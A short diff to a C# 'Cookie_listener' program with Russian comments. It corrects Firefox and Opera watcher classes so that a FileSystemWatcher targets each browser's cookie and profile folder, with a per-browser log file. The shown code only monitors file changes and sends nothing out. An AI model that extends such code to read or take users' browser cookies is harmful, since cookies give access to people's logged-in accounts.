@@ -95,7 +95,7 @@ namespace Cookie_listener
             // создаем имя и разшерение для файла лога
             _name_log_file = "\\log_fo_FireFoxe.txt";
             // адрес папки с куки
-            _path_to_cookie += "\\Google\\Chrome\\User Data\\Profile 39";
+            _path_to_cookie += "\\Mozilla\\Firefox\\Profiles\\zvivgqy3.default";
             _watcher = new FileSystemWatcher(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _path_to_cookie); // тут мы укажем то за чем мы следим           
         }
     }
@@ -107,8 +107,8 @@ namespace Cookie_listener
             // создаем имя и разшерение для файла лога
             _name_log_file = "\\log_fo_Opera.txt";
             // адрес папки с куки
-            _path_to_cookie += "\\Google\\Chrome\\User Data\\Profile 39";
-            _watcher = new FileSystemWatcher(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _path_to_cookie); // тут мы укажем то за чем мы следим           
+            _path_to_cookie += "\\Opera Software\\Opera Stable";
+            _watcher = new FileSystemWatcher(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _path_to_cookie); // тут мы укажем то за чем мы следим           
         }
     }
 }
